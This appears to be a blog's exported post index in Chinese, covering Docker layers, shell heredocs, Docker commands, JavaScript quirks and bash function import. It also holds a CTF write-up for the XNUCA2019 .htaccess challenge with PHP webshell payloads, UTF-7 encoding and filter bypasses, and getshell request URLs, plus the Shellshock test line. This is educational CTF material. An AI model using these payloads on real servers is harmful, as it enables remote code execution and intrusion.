Docker where to look for any files that need to be added to the image. 123456789$ docker build -t acme/my-base-image:1.0 -f Dockerfile.base .Sending build context to Docker daemon 812.4MBStep 1/2 : FROM ubuntu:18.04 ---&gt; d131e0fa2585Step 2/2 : COPY . /app ---&gt; Using cache ---&gt; bd09118bcef6Successfully built bd09118bcef6Successfully tagged acme/my-base-image:1.0 Build the second image. 1234567891011$ docker build -t acme/my-final-image:1.0 -f Dockerfile .Sending build context to Docker daemon 4.096kBStep 1/2 : FROM acme/my-base-image:1.0 ---&gt; bd09118bcef6Step 2/2 : CMD /app/hello.sh ---&gt; Running in a07b694759ba ---&gt; dbf995fc07ffRemoving intermediate container a07b694759baSuccessfully built dbf995fc07ffSuccessfully tagged acme/my-final-image:1.0 Check out the sizes of the images: 12345$ docker image lsREPOSITORY TAG IMAGE ID CREATED SIZEacme/my-final-image 1.0 dbf995fc07ff 58 seconds ago 103MBacme/my-base-image 1.0 bd09118bcef6 3 minutes ago 103MB Check out the layers that comprise each image: 123456789$ docker history bd09118bcef6IMAGE CREATED CREATED BY SIZE COMMENTbd09118bcef6 4 minutes ago /bin/sh -c #(nop) COPY dir:35a7eb158c1504e... 100B d131e0fa2585 3 months ago /bin/sh -c #(nop) CMD [&quot;/bin/bash&quot;] 0B &lt;missing&gt; 3 months ago /bin/sh -c mkdir -p /run/systemd &amp;&amp; echo &#x27;... 7B &lt;missing&gt; 3 months ago /bin/sh -c sed -i &#x27;s/^#\\s*\\(deb.*universe\\... 2.78kB &lt;missing&gt; 3 months ago /bin/sh -c rm -rf /var/lib/apt/lists/* 0B &lt;missing&gt; 3 months ago /bin/sh -c set -xe &amp;&amp; echo &#x27;#!/bin/sh&#x27; &gt;... 745B &lt;missing&gt; 3 months ago /bin/sh -c #(nop) ADD file:eef57983bd66e3a... 103MB 1234567891011$ docker history dbf995fc07ffIMAGE CREATED CREATED BY SIZE COMMENTdbf995fc07ff 3 minutes ago /bin/sh -c #(nop) CMD [&quot;/bin/sh&quot; &quot;-c&quot; &quot;/a... 0B bd09118bcef6 5 minutes ago /bin/sh -c #(nop) COPY dir:35a7eb158c1504e... 100B d131e0fa2585 3 months ago /bin/sh -c #(nop) CMD [&quot;/bin/bash&quot;] 0B &lt;missing&gt; 3 months ago /bin/sh -c mkdir -p /run/systemd &amp;&amp; echo &#x27;... 7B &lt;missing&gt; 3 months ago /bin/sh -c sed -i &#x27;s/^#\\s*\\(deb.*universe\\... 2.78kB &lt;missing&gt; 3 months ago /bin/sh -c rm -rf /var/lib/apt/lists/* 0B &lt;missing&gt; 3 months ago /bin/sh -c set -xe &amp;&amp; echo &#x27;#!/bin/sh&#x27; &gt;... 745B &lt;missing&gt; 3 months ago /bin/sh -c #(nop) ADD file:eef57983bd66e3a... 103MB Notice that all the layers are identical except the top layer of the second image. All the other layers are shared between the two images, and are only stored once in /var/lib/docker/. The new layer actually doesn’t take any room at all, because it is not changing any files, but only running a command. Note: The &lt;missing&gt; lines in the docker history output indicate that those layers were built on another system and are not available locally. This can be ignored. 修改时复制策略 copy-on-write (CoW) docker通过一个叫做copy-on-write (CoW) 的策略来保证base镜像的安全性，以及更高的性能和空间利用率。 Copy-on-write is a strategy of sharing and copying files for maximum efficiency. If a file or directory exists in a lower layer within the image, and another layer (including the writable layer) needs read access to it, it just uses the existing file. The first time another layer needs to modify the file (when building the image or running the container), the file is copied into that layer and modified. This minimizes I/O and the size of each of the subsequent layers. These advantages are explained in more depth below. Copying makes containers efficient When you start a container, a thin writable container layer is added on top of the other layers. Any changes the container makes to the filesystem are stored here. Any files the container does not change do not get copied to this writable layer. This means that the writable layer is as small as possible. When an existing file in a container is modified, the storage driver performs a copy-on-write operation. The specifics steps involved depend on the specific storage driver. For the aufs, overlay, and overlay2 drivers, the copy-on-write operation follows this rough sequence: Search through the image layers for the file to update. The process starts at the newest layer and works down to the base layer one layer at a time. When results are found, they are added to a cache to speed future operations. Perform a copy_up operation on the first copy of the file that is found, to copy the file to the container’s writable layer. Any modifications are made to this copy of the file, and the container cannot see the read-only copy of the file that exists in the lower layer. Btrfs, ZFS, and other drivers handle the copy-on-write differently. You can read more about the methods of these drivers later in their detailed descriptions. Containers that write a lot of data consume more space than containers that do not. This is because most write operations consume new space in the container’s thin writable top layer. 简单的说，启动容器的时候，最上层容器层是可写层，之下的都是镜像层，只读层。 当容器需要读取文件的时候 从最上层镜像开始查找，往下找，找到文件后读取并放入内存，若已经在内存中了，直接使用。(即，同一台机器上运行的docker容器共享运行时相同的文件)。 当容器需要添加文件的时候 直接在最上面的容器层可写层添加文件，不会影响镜像层。 当容器需要修改文件的时候 从上往下层寻找文件，找到后，复制到容器可写层，然后，对容器来说，可以看到的是容器层的这个文件，看不到镜像层里的文件。容器在容器层修改这个文件。 当容器需要删除文件的时候 从上往下层寻找文件，找到后在容器中记录删除。即，并不会真正的删除文件，而是软删除。这将导致镜像体积只会增加，不会减少。 综上，Docker镜像通过分层实现了资源共享，通过copy-on-write实现了文件隔离。 对于文件只增加不减少问题，我们应当在同一层做增删操作，从而减少镜像体积。比如，如下测试。 Dockerfile.A: 分层删除文件 12345678FROM centos:7RUN yum install -y vimRUN yum install -y httpdWORKDIR /homeRUN dd if=/dev/zero of=50M.file bs=1M count=50#创建大小为50M的测试文件RUN rm -rf 50M.fileCMD [&quot;/bin/bash&quot;] 构建 1docker build -t test:a -f Dockerfile.A . Dockerfile.B: 同层删除 12345FROM centos:7RUN yum install -y vimRUN yum install -y httpdWORKDIR /homeRUN dd if=/dev/zero of=50M.file bs=1M count=50 &amp;&amp; rm -rf 50M.file 构建 1docker build -t test:b -f Dockerfile.B . 比较二者大小 123[root@sh-k8s-001 tmp]# docker images | grep testtest a ae673aa7db48 9 minutes ago 497MBtest b 21b2bc49f0bd 12 minutes ago 444MB 显然，分层删除操作并没有真正删除掉文件。 来源 https://www.cnblogs.com/CloudMan6/p/6799197.html https://www.cnblogs.com/CloudMan6/p/6806193.html https://docs.docker.com/storage/storagedriver/"},{"title":"cat手动输入","date":"2020-05-17","updated":"2024-03-19","path":"2020/05/17/cat手动输入/","text":"一 关于cat &lt;&lt; EOF语句的意思 在linux shell脚本中cat &lt;&lt; EOF的语句，起到什么作用？ 首先必须要说明的是EOF在这里没有特殊的含义，你可以使用FOE或OOO等（当然也不限制在三个字符或大写字符）。 接下来，简单描述一下几种常见的使用方式及其作用： cat&lt;&lt;EOF，以EOF输入字符为标准输入结束： cat&gt;filename，创建文件，并把标准输入输出到filename文件中，以ctrl+d作为输入结束： cat&gt;filename&lt;&lt;EOF，以EOF作为输入结束，和ctrl+d的作用一样： 二 cat &lt;&lt;EOF与cat &lt;&lt;-EOF的区别 两个都是获取stdin,并在EOF处结束stdin，输出stdout。 但是&lt;&lt;-是什么意思呢？ 先来看man中的说明： If the redirection operator is &lt;&lt;-, then all leading tab characters are stripped from input lines and the line containing delimiter. 翻译过来的意思就是：如果重定向的操作符是&lt;&lt;-，那么分界符（EOF）所在行的开头部分的制表符（Tab）都将被去除。 这可以解决由于脚本中的自然缩进产生的制表符。 通俗一点的解释： 在我们使用cat &lt;&lt;EOF时，我们输入完成后，需要在一个新的一行输入EOF结束stdin的输入。EOF必须顶行写，前面不能用制表符或者空格。 比如,下面的语句就不会出错： cat &gt;1.txt&lt;&lt;EOF Hello,world! EOF 如果结束分解符EOF前有制表符或者空格，则EOF不会被当做结束分界符，只会继续被当做stdin来输入。 而&lt;&lt;-就是为了解决这一问题： cat &gt;1.txt&lt;&lt;-EOF Hello,world! EOF 上面的写法，虽然最后的EOF前面有多个制表符和空格，但仍然会被当做结束分界符，表示stdin的结束,这就是&lt;&lt;和&lt;&lt;-的区别。"},{"title":"docker修改容器端口映射","date":"2020-05-16","updated":"2024-03-19","path":"2020/05/16/docker修改容器端口映射/","text":"方法一 1、停止容器(docker stop d00254ce3af7) 2、停止docker服务(systemctl stop docker) 3、修改这个容器的hostconfig.json文件中的端口（原帖有人提到，如果config.v2.json里面也记录了端口，也要修改） 12345678910cd /var/lib/docker/containers/d00254ce3af7* #这里是CONTAINER IDvim hostconfig.json如果之前没有端口映射, 应该有这样的一段:&quot;PortBindings&quot;:&#123;&#125;增加一个映射, 这样写:&quot;PortBindings&quot;:&#123;&quot;8080/tcp&quot;:[&#123;&quot;HostIp&quot;:&quot;&quot;,&quot;HostPort&quot;:&quot;60000&quot;&#125;]&#125;前一个数字是容器端口, 后一个是宿主机端口。将宿主机的60000端口映射到容器的8080端口而修改现有端口映射更简单, 把端口号改掉就行。 4、启动docker服务(systemctl start docker) 5、启动容器(docker start d00254ce3af7) hostconfig.json文件 vim下执行:%!python3 -m json.tool格式化代码 config.v2.json文件 方法二 1、获得容器IP 将container_name 换成实际环境中的容器名 1docker inspect `container_name` | grep IPAddress 2、iptable转发端口 将宿主机的60000端口映射到容器的8080端口 1iptables -t nat -A DOCKER -p tcp --dport 60000 -j DNAT --to-destination 172.17.0.2:8080"},{"title":"docker的run-exec-attach区别","date":"2020-05-11","updated":"2024-03-19","path":"2020/05/11/docker的run-exec-attach区别/","text":"docker run；创建和启动一个新的容器实例，操作对象是镜像，选项较多，如果你要创建和启动一个容器，只能用run； 官方命令解释：Run a command in a new container,翻译过来是在一个新的容器中中运行命令，所以主要作用有两点：一是创建和启动一个新的容器，二是启动时通过加选项和参数在容器运行命令； 123docker run [OPTIONS] IMAGE [COMMAND] [ARG...] IMAGE: 镜像名称，run操作的是镜像images COMMAND：命令，可选 123# docker run -p 80:80 -d --name=nginx-1 nginx // 在后台创建和启动容器nginx-1，不执行命令# docker run -p 81:80 -d --name=nginx-2 nginx bash -c &#x27;ls &amp; tail -f /dev/null&#x27; // 在后台创建和启动容器nginx-2，同时执行组合命令# docker logs nginx-2 // 查看命令输出，可以看到ls执行的结果 docker exec: 在已运行的容器中，执行命令，操作对象是容器，如果你要进入已运行的容器，并且执行命令，用exec； 官方命令解释：Run a command in a running container,翻译过来就是在一个正在运行的容器中执行命令，exec是针对已运行的容器实例进行操作，在已运行的容器中执行命令，不创建和启动新的容器。 12docker attach [OPTIONS] CONTAINER CONTAINER:容器名称或ID，必选，attach的操作对象也是容器 123# docker run -p 82:80 -d --name=nginx-3 nginx # docker exec -it nginx-3 /bin/bash // 直接进入容器nginx-3，执行bash# docker exec nginx-3 bash -c &quot;ls&quot; // 在容器中执行命令 ls，输出结果 如果只使用-t参数，则可以看到一个console窗口，但是执行命令会发现由于没有获得stdin的输出，无法看到命令执行情况。 123456789101112[root@localhost temp]# docker exec -t bb2 /bin/sh/ # pwd hanging....[root@localhost temp]# docker exec -t bb2 pwd/[root@localhost temp]# echo $?0[root@localhost temp]# docker exec -t bb2 dir2015/07/14 04:03:57 docker-exec: failed to exec: exec: &quot;dir&quot;: executable file not found in $PATH[root@localhost temp]# echo $?0 可以看出只用-i时，由于没有分配伪终端，看起来像pipe执行一样。但是执行结果、命令返回值都可以正确获取。 123456789[root@localhost temp]# docker exec -i bb2 /bin/shdateTue Jul 14 04:01:11 UTC 2015echo $?0dir/bin/sh: dir: not foundecho $?127 docker attach: 同样操作的是已运行的容器，可以将本机标准输入（键盘输入）输到容器中，也可以将容器的输出显示在本机的屏幕上，如果你想查看容器运行过程中产生的标准输入输出，用attach； 官方命令解释：Attach local standard input, output, and error streams to a running container，翻译过来，将本机的标准输入（键盘）、标准输出（屏幕）、错误输出（屏幕）附加到一个运行的容器，也就是说本机的输入直接输到容器中，容器的输出会直接显示在本机的屏幕上。 12docker attach [OPTIONS] CONTAINERCONTAINER:容器名称或ID，必选，attach的操作对象也是容器 12345# docker run -p 83:80 -d --name=nginx-4 nginx # docker attach nginx-4 // 本机上再打开一个终端，输入以下命令，观察上面终端的输出 # curl localhost:83 // nginx输出正常访问记录 # curl localhost:84/index // nginx输出访问错误记录 Docker attach可以attach到一个已经运行的容器的stdin，然后进行命令执行的动作。 但是需要注意的是，如果从这个stdin中exit，会导致容器的停止。 常用参数说明 这三个参数(-i, -t, -d)是啥意思 Options Mean -i 以交互模式运行容器，通常与 -t 同时使用； -t 为容器重新分配一个伪输入终端，通常与 -i 同时使用； -d 后台运行容器，并返回容器ID； -v 挂载宿主机一个目录至容器目录 –restart=always 创建容器时添加参数 --restart=always 后，当 docker 重启时，容器自动启动。(若一开始没有加上，可以执行：docker container update --restart=always 容器名字 进行变更) –name 容器名称 -p 宿主机器服务端口：容器机器服务端口 https://blog.csdn.net/MePlusPlus/article/details/92822329"},{"title":"安卓微信7版本后无法抓包","date":"2020-05-08","updated":"2024-03-19","path":"2020/05/08/安卓微信7版本后无法抓包/","text":"https://testerhome.com/topics/17746"},{"title":"CTF中的htaccess","date":"2020-05-07","updated":"2024-03-19","path":"2020/05/07/CTF中的htaccess/","text":"服务器中间件为apache，因此想到了传.htaceess来解析php，通常我们用 .htaccess来解析非php后缀文件时用到 AddType application/x-httpd-php .ppp 或者 123&lt;FilesMatch &quot;shell.jpg&quot;&gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt; auto_append_file和auto_prepend_file 相关bypass 如果文件末尾被自动加上一句话,会导致服务器500错误,这时候可以在最后添加#\\ 将换行转义成普通字符 如果特殊字符被实体编码, 可以通过特殊编码来绕过 相关比赛 XNUCA2019Qualifier"},{"title":"XNUCA2019Qualifier","date":"2020-05-07","updated":"2024-03-19","path":"2020/05/07/XNUCA2019Qualifier/","text":"题目复现链接：https://buuoj.cn/challenges 打开题目给了我们源码： 12345678910111213141516171819202122232425262728293031323334 &lt;?php $files = scandir(&#x27;./&#x27;); foreach($files as $file) &#123; if(is_file($file))&#123; if ($file !== &quot;index.php&quot;) &#123; unlink($file); &#125; &#125; &#125; include_once(&quot;fl3g.php&quot;); if(!isset($_GET[&#x27;content&#x27;]) || !isset($_GET[&#x27;filename&#x27;])) &#123; highlight_file(__FILE__); die(); &#125; $content = $_GET[&#x27;content&#x27;]; if(stristr($content,&#x27;on&#x27;) || stristr($content,&#x27;html&#x27;) || stristr($content,&#x27;type&#x27;) || stristr($content,&#x27;flag&#x27;) || stristr($content,&#x27;upload&#x27;) || stristr($content,&#x27;file&#x27;)) &#123; echo &quot;Hacker&quot;; die(); &#125; $filename = $_GET[&#x27;filename&#x27;]; if(preg_match(&quot;/[^a-z\\.]/&quot;, $filename) == 1) &#123; echo &quot;Hacker&quot;; die(); &#125; $files = scandir(&#x27;./&#x27;); foreach($files as $file) &#123; if(is_file($file))&#123; if ($file !== &quot;index.php&quot;) &#123; unlink($file); &#125; &#125; &#125; file_put_contents($filename, $content . &quot;\\nJust one chance&quot;);?&gt; 分析源码： 首先删除当前目录下非index.php的文件 然后include(‘fl3g.php’)，之后获取filename和content并写入文件中。其中对filename和content都有过滤。filename若匹配到除了a-z和单引号.以外的其它字符，则触发waf 文件内容结尾被加上了一行 功能很简单： 一个写文件的功能且只能写文件名为[a-z.]* 的文件，且文件内容存在黑名单过滤，并且结尾被加上了一行，这就导致我们无法直接写入.htaccess里面auto_prepend_file等php_value。 预期解中知识点： https://www.cnblogs.com/tr1ple/p/11439994.html 1. htaccess生效 如果尝试上传htaccess文件会发现出现响应500的问题，因为文件尾有Just one chance 这里采用# \\的方式将换行符转义成普通字符，就可以用#来注释单行了。 2. 利用文件包含 代码中有一处include_once(&quot;fl3g.php&quot;);，php的配置选项中有include_path可以用来设置include的路径。如果tmp目录下有fl3g.php，在可以通过将include_path设置为tmp的方式来完成文件包含。 .htaccess可以设置php_value include_path &quot;xxx&quot;将include()的默认路径改变 3. 指定目录写文件 .htaccess文件中可以自己定义error_log，更多配置可以在php.ini配置选项列表找到 error_log可以将php运行报错的记录写到指定文件中。 如何触发报错呢？这就是为什么代码中写了一处不存在的fl3g.php的原因。我们可以将include_path的内容设置成payload的内容，这时访问页面，页面尝试将payload作为一个路径去访问时就会因为找不到fl3g.php而报错，而如果fl3g.php存在，则会因为include_path默认先访问web目录而不会报错。 123php_value include_path &quot;xxx&quot; php_value error_reporting 32767 php_value error_log /tmp/fl3g.php 据此可以做到将报错信息中的payload，如: 1[Fri Oct 25 17:44:29.533900 2019] [php7:warn] [pid 1387] [client 172.20.10.2:1147] PHP Warning: include_once(): Failed opening &#x27;fl3g.php&#x27; for inclusion (include_path=&#x27;.:/usr/share/php&#x27;) in /var/www/html/ctf/index.php on line 10 这里就可以将shellcode配合include写进其它目录。 4. php_flag zend.multibyte 1结合php_value zend.script_encoding &quot;UTF-7&quot;绕过尖括号&lt;过滤 index.php?filename=.htaccess&amp;content=php_value include_path &quot;&lt;?=phpinfo();?&gt;&quot;%0d%0aphp_value log_errors 1%0d%0aphp_value error_log /tmp/fl3g.php%0d%0a%23 \\ 写入htaccess. 然而很不幸的是error_log的内容默认是htmlentities的,我们无法插入类似&lt;?php phpinfo();?&gt;的payload。那么怎么才能绕过这里的转义？ 再次访问index.php 此时将include_path中的payload写入到了fl3g.php中，但是从观察来看&lt;&gt;被html实体编码转义了，html_errors里面html也被过滤了。说明此时shell无法利用，suctf也考到了.htaccess中编码来绕过&lt;?的过滤，但是此时只转义了&lt;，因此UTF-16,UTF-32均无法bypass，此时结合[Insomnihack 2019 I33t-hoster](https://github.com/mdsnins/ctf-writeups/blob/master/2019/Insomnihack 2019/l33t-hoster/l33t-hoster.md)题解中使用UTF-7编码来绕过&lt;的过滤，结合php.ini的设置项 写入utf-7编码的shellcode可以绕过&lt;?的过滤 +ADw?php phpinfo()+ADs +AF8AXw-halt+AF8-compiler()+ADs 需要在.htaccess中配置解析的编码: 12php_flag zend.multibyte 1 php_value zend.script_encoding &quot;UTF-7&quot; 综上： 最后生成的.htaccess是这样的 12345php_value include_path &quot;/tmp&quot;php_value zend.multibyte 1php_value zend.script_encoding &quot;UTF-7&quot;# \\Just one chance 非预期解1知识点 设置pcre的一些选项可以导致文件名判断失效，从而直接写入fl3g.php 12php_value pcre.backtrack_limit 0php_value pcre.jit 0 if(preg_match(&quot;/[^a-z.]/&quot;, $filename) == 1) 而不是 if(preg_match(&quot;/[^a-z.]/&quot;, $filename) !== 0), 因此可以通过 php_value 设置正则回朔次数来使正则匹配的结果返回为 false 而不是 0 或 1, 默认的回朔次数比较大, 可以设成 0, 那么当超过此次数以后将返回 false filename即可通过伪协议绕过前面stristr的判断实现Getshell 非预期解2知识点 12php_value auto_prepend_file &quot;.htaccess&quot;#&lt;?PHP eval($_GET[a]);?&gt;\\ 因为后面content会拼接无意义字符串， 因此采用.htaccess的单行注释绕过 # \\，这里反斜杠本来就有拼接上下两行的功能，因此这里本来就可以直接使用\\来连接被过滤掉的关键字来写入.htaccess 结合上面： 预期解1 https://www.anquanke.com/post/id/185377#h3-6 Step1 写入.htaccess error_log相关的配置 12345php_value include_path &quot;/tmp/xx/+ADw?php die(eval($_GET[2]))+ADs +AF8AXw-halt+AF8-compiler()+ADs&quot;php_value error_reporting 32767php_value error_log /tmp/fl3g.php# \\http://65e4f7f3-b20b-4d9e-9de1-a59e81fd43b4.node3.buuoj.cn/index.php?filename=.htaccess&amp;content=php_value%20error_log%20/tmp/fl3g.php%0d%0aphp_value%20error_reporting%2032767%0d%0aphp_value%20include_path%20%22+ADw?php%20eval($_GET[1])+ADs%20+AF8AXw-halt+AF8-compiler()+ADs%22%0d%0a#%20\\ Step2 访问index.php留下error_log Step3 写入.htaccess新的配置 1234php_value include_path &quot;/tmp&quot;php_value zend.multibyte 1php_value zend.script_encoding &quot;UTF-7&quot;# \\ index.php?filename=.htaccess&amp;content=php_value include_path &quot;/tmp&quot;%0d%0aphp_value zend.multibyte 1%0d%0aphp_value zend.script_encoding &quot;UTF-7&quot;%0d%0a# \\ Step4 再访问一次index.php?1=evilcode即可getshell. 非预期解1 1234php_value pcre.backtrack_limit 0php_value auto_append_file &quot;.htaccess&quot;php_value pcre.jit 0#aa&lt;?php eval($_GET[&#x27;a&#x27;]);?&gt;\\ 令filename为： filename=php://filter/write=convert.base64-decode/resource=.htaccess 这样content就能绕过stristr，一般这种基于字符的过滤都可以用编码进行绕过，这样就能getshell了 这里还学到了p牛的一篇文章：php://filter的妙用 非预期解2 因为后面content会拼接无意义字符串， 因此采用.htaccess的单行注释绕过 # \\，这里反斜杠本来就有拼接上下两行的功能，因此这里本来就可以直接使用\\来连接被过滤掉的关键字来写入.htaccess， 12php_value auto_prepend_fi\\ le &quot;.htaccess&quot;"},{"title":"bash-环境变量中导入函数","date":"2020-05-07","updated":"2024-03-19","path":"2020/05/07/bash-环境变量中导入函数/","text":"Bash 4.3.30 及之后的版本 注意，本文所讲的表现仅适用于 Bash 4.3.30 及之后的版本， 1234567root@kali:~# bash --versionGNU bash，版本 5.0.16(1)-release (x86_64-pc-linux-gnu)Copyright (C) 2019 Free Software Foundation, Inc.许可证 GPLv3+: GNU GPL 许可证第三版或者更新版本 &lt;http://gnu.org/licenses/gpl.html&gt;本软件是自由软件，您可以自由地更改和重新发布。在法律许可的情况下特此明示，本软件不提供任何担保。 所谓的环境变量的真实面目其实就是个任意字符串 Bash 在启动时会将 environ 数组中包含 ＝ 号的字符串导入成为自己的变量 Bash 在启动外部命令时会将自己内部标记为环境变量的变量重组成字符串数组赋值给 environ 本文中继续深入讲三点： environ 数组中可能存在 ＝ 左边名字相同的元素，也就是同名的环境变量，Bash 是怎么导入的？ Bash 还可以从环境变量中导入函数，甚至同时导入两个同名的变量和函数 Bash 还可以同时导出两个同名的变量和函数 如果有两个同名的环境变量，很简单，那么后面的值会覆盖前面的： 12root@kali:~# env foo=1 foo=2 bash -c &#x27;echo $foo&#x27;2 Bash 其实是可以从环境变量中导入函数的，比如下面这样： 1234567891011121314151617root@kali:~# foo()&#123; echo test; &#125;root@kali:~# footestroot@kali:~# export -f fooroot@kali:~# footestroot@kali:~# set | grep foo_=foofoo () root@kali:~# env | grep fooBASH_FUNC_foo%%=() &#123; echo testroot@kali:~# export | grep fooroot@kali:~# bash # 进入子shellroot@kali:~# footest set:显示(设置)shell变量 包括的私有变量以及用户变量，不同类的shell有不同的私有变量 bash,ksh,csh每中shell私有变量都不一样 env:显示(设置)用户变量变量 export:显示(设置)当前导出成用户变量的shell变量。 12345678910[oracle@zhou3 ~]$ aaa=bbb --shell变量设定 [oracle@zhou3 ~]$ echo $aaa bbb [oracle@zhou3 ~]$ env| grep aaa --设置完当前用户变量并没有 [oracle@zhou3 ~]$ set| grep aaa --shell变量有 aaa=bbb [oracle@zhou3 ~]$ export| grep aaa --这个指的export也没导出，导出变量也没有 [oracle@zhou3 ~]$ export aaa --那么用export 导出一下 [oracle@zhou3 ~]$ env| grep aaa --发现用户变量内存在了 aaa=bbb 总结:linux 分 shell变量(set)，用户变量(env)， shell变量包含用户变量，export是一种命令工具，是显示那些通过export命令把shell变量中包含的用户变量导入给用户变量的那些变量. 上一级的 Shell 把函数传给了它的 child shell，Bash 是怎么实现的呢？我们用 env 命令演示一下： 12root@kali:~# env &#x27;BASH_FUNC_foo%%=() &#123; echo test2; &#125;&#x27; bash -c &#x27;foo&#x27;test2 其实 Bash 就是把满足 BASH_FUNC_函数名%%＝()&#123; 函数体 格式的环境变量作为函数源码解析并导入。所以两个同名的变量和函数并不会冲突，可以同时导入，像这样： 12root@kali:~# env &#x27;foo=1&#x27; &#x27;BASH_FUNC_foo%%=() &#123; echo $1; &#125;&#x27; bash -c &#x27;foo $foo&#x27;1 既然可以同时导入，那么导出更没问题了： 123456root@kali:~# foo=1root@kali:~# foo()&#123; echo test3; &#125;root@kali:~# export foo;export -f fooroot@kali:~# env | grep foofoo=1BASH_FUNC_foo%%=() &#123; echo test3 Bash 4.3.30 之前的版本 安全漏洞bashshock https://www.freebuf.com/vuls/44994.html BASH除了可以将shell变量导出为环境变量，还可以将shell函数导出为环境变量！当前版本的bash通过以函数名作为环境变量名，以“（）{”开头的字串作为环境变量的值来将函数定义导出为环境变量。 此次爆出的漏洞在于BASH处理这样的“函数环境变量”的时候，并没有以函数结尾“}”为结束，而是一直执行其后的shell命令。 $ env x=‘() &#123; :;&#125;; echo vulnerable&amp;#039; bash -c &quot;echo this is a test&quot; 之前的 Bash 版本在导出函数时不会给函数名加上 BASH_FUNC_ 前缀和 %% 后缀，在导入时也不会识别前缀后缀，只要看到 ＝ 右边是 () &#123; 这四个字符，就按函数导入，像这样： 12env &#x27;foo=() &#123; echo foo函数; &#125;&#x27; bash -c &#x27;foo&#x27;foo函数 以后的版本: 1234root@kali:~# env &#x27;foo=()&#123; echo test4; &#125;&#x27; bash -c &#x27;foo&#x27;test3 # test3是刚才定义的 BASH_FUNC_foo%%=() &#123; echo test3 # 也就是说foo并没有更新成函数 由于环境变量字符串的转换和识别规则不同，假如你在 Bash 4.3.30 中打开一个 Bash 3.2.25，后者是无法继承到前者导出的函数的： 1234567$ bash4.3.30$ foo() &#123; echo foo函数 ; &#125;$ export -f foo$ bash3.2.25$ foobash3.2.25: foo: command not found 反之亦然，同时 foo 会被导入成一个变量： 1234567891011$ bash3.2.25$ foo() &#123; echo foo函数 ; &#125;$ export -f foo$ bash4.3.30$ foobash3.2.25: foo: command not found$ echo $foo() &#123; echo foo函数 &#125; ​"},{"title":"一个JavaScript的面试题","date":"2020-05-06","updated":"2024-03-19","path":"2020/05/06/一个JavaScript的面试题/","text":"12345678910111213141516171819202122232425function Foo() &#123; getName = function () &#123; alert (1); &#125;; return this;&#125;Foo.getName = function () &#123; alert (2);&#125;;Foo.prototype.getName = function () &#123; alert (3);&#125;;var getName = function () &#123; alert (4);&#125;;function getName() &#123; alert (5);&#125; //请写出以下输出结果：Foo.getName();getName();Foo().getName();getName();new Foo.getName();new Foo().getName();new new Foo().getName();// 输出结果为// 2// 4// 1// 1// 2// 3// 3 有空在写吧 下面对输出值进行分析: .getName() 输出为 2, 访问的是函数 Foo 上的静态属性，输出为 2。 现在,尝试在函数内定义 getName 函数和在 Foo 原型上绑定 getName 函数, 都无法成功执行 Foo.getName(), 而以字面量创建对象的方式创建对象后，则能正常的执行 getName() 函数。 通过创建对象运行 getName() 定义在函数内部无法正常执行,即使它是全局变量。 结论: 由于函数本身是对象，通过函数绑定属性和方法属于静态方法 ，可以直接调用。绑定在原型上的属性和方法要创建对象后才能调用，在构造函数对象内部定义的方法无法通过对象调用。 getName(); 结果输出为 4，而不是输出 5。这是因为JS 存在变量声明提升(所有声明的变量或声明的函数都会被提升到当前函数的顶部)。 故代码执行顺序为: 1234var getName;function getName() &#123; alert(5); &#125;// ... 省略代码getName = function () &#123; alert(4) &#125; 最终执行 getName 输出为 4 延伸题目: 12345console.log( Foo )function Foo() &#123; console.log(1);&#125;var Foo = 1 Foo 的输出结果为? Foo().getName(); 输出值为1, 先执行 Foo() 函数，定义全局变量 getName, 之后调用全局对象的 getName() 方法, 返回 1。 注意， Foo() 函数返回的 this 指向的是全局对象 window,所以调用的是全局对象 getName()。 函数里的 getName 绑定的是全局对象，通过 Foo 调用会报错。 Node 下执行这条语句会报错，因为 node 没有全局对象 window， 所以无法调用 getName getName() 调用全局函数, 因为执行 Foo()， 更新了 getName 的值，所以返回 1。 new Foo.getName() 考察了运算符的优先级。 . 的优先级高于 new, 相当于执行 new (Foo.getName)()， 相当于执行 getName 的构造函数，返回 2 new Foo().getName() 执行方式为 (new Foo()).getName() 先生成 Foo 对象, 再执行 getName() 函数。 在 new Foo() 返回的是新创建的空对象，由于对象这时还没绑定属性 getName, 所以这时调用的是原型上的 getName, 结果返回3 注意: 构造函数 return this，在执行 new 的时候，返回的是新创建的对象。 延伸题目: 12345678function A() &#123; this.a = 2; function B() &#123; this.a = 1; &#125; return B();&#125;console.log(new A()); a的值是? 如果 return new B(); a的值是? new new Foo().getName() 可以改写为 new ((new Foo()).getName)() 先初始化实例，然后将原型对象上的 getName() 作为构造函数执行，结果返回 3 最终代码可以优化为 123456789101112131415161718var getName;function getName() &#123; alert(5); &#125;function Foo() &#123; getName = function() &#123; alert(1); &#125; return this&#125;Foo.getName = function() &#123; alert(2); &#125;Foo.prototype.getName = function() &#123; alert(3); &#125;getName = function () &#123; alert(4); &#125;Foo.getName(); // 2getName(); // 4Foo();getName(); // 1getName(); // 1Foo.getName(); // 2(new Foo()).getName(); // 3(new Foo()).getName(); // 3 https://github.com/Wscats/articles/issues/85 https://juejin.im/post/5c6cb5bae51d45012d068579"},{"title":"JS-私有公有静态属性方法","date":"2020-05-06","updated":"2024-03-19","path":"2020/05/06/JS-私有公有静态属性方法/","text":"123456789101112131415function User(name) &#123; var name = name; //私有属性 this.name = name; //公有属性 function getName() &#123; //私有方法 return name; &#125;&#125;User.prototype.getName = function() &#123; //公有方法 return this.name;&#125;User.name = &#x27;Wscats&#x27;; //静态属性User.getName = function() &#123; //静态方法 return this.name;&#125;var Wscat = new User(&#x27;Wscats&#x27;); //实例化 注意下面这几点： 调用公有方法，公有属性，我们必需先实例化对象，也就是用new操作符实化对象，就可构造函数实例化对象的方法和属性，并且公有方法是不能调用私有方法和静态方法的 静态方法和静态属性就是我们无需实例化就可以调用 而对象的私有方法和属性,外部是不可以访问的"},{"title":"JS-函数嵌套","date":"2020-05-06","updated":"2024-03-19","path":"2020/05/06/JS-函数嵌套/","text":"在Javascript中，函数中可以嵌套其他函数。例如： 12345678910function distance(x1, y1, x2, y2) &#123; function square (x) &#123; return x * x; &#125; return Math.sqrt(square(x1 - x2) + square(y1 - y2));&#125; var result = distance(0, 0, 3, 4);console.log(result); // 5 在上述代码中，函数square中嵌套定义在函数distance中。square只能在distance中被调用。如果试图在distance的外面调用square，将会出错。 如果嵌套函数使用了外面函数的变量或者参数，那么这个嵌套函数就形成了一个闭包（Closure）。 2.1 闭包能在它外面的函数执行完之后仍然能够访问他外面函数的参数和变量。例如： 123456789101112131415function sayGreeting(greeting) &#123; var prefix = &quot;my friend &quot;; return function sayGreetingTo(name) &#123; return greeting + &quot;, &quot; + prefix + name; &#125;&#125; 